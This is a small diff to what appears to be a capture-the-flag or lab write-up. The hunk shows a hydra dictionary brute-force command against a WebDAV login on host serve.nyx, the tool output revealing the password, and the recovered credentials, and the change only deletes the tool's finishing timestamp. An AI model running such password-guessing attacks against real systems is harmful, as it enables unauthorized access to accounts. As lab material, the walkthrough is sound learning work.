@@ -176,7 +176,6 @@ $ hydra -l admin -P dictionary.txt -f serve.nyx http-get /webdav -v -I
 [80][http-get] host: serve.nyx   login: admin   password: w3bd4v513
 [STATUS] attack finished for serve.nyx (1 valid pair found)
 1 of 1 target successfully completed, 1 valid password found
-Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-05-17 18:33:51
 ```
 
 > **Credentials:** `admin:w3bd4v513`
